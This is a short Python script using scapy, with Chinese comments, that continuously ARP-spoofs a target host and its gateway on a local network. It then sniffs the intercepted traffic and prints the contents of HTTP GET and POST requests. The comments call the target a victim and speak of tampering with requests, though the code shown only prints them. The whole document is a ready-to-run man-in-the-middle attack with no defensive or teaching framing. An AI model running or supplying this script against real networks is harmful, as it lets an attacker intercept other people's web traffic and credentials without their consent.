
import scapy.all as scapy
from scapy.layers.l2 import ARP
from scapy.sendrecv import send, sniff

# ARP 欺騙
def spoof(target_ip, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(arp_response, verbose=False)

# 攔截 HTTP 請求並篡改
def http_sniff(packet):
    if packet.haslayer(scapy.IP) and packet.haslayer(scapy.TCP):
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if b"GET" in load or b"POST" in load:
                print(f"HTTP Request from {ip_src} to {ip_dst}: {load}")

# 受害者與網關的 IP 地址
target_ip = "192.168.1.5"  # 目標IP
gateway_ip = "192.168.1.1"  # 網關IP

# 開始ARP欺騙，並攔截HTTP流量
while True:
    spoof(target_ip, gateway_ip)  # 讓目標向攻擊者發送流量
    spoof(gateway_ip, target_ip)  # 讓網關向攻擊者發送流量
    sniff(filter="ip", prn=http_sniff, store=0, timeout=10)
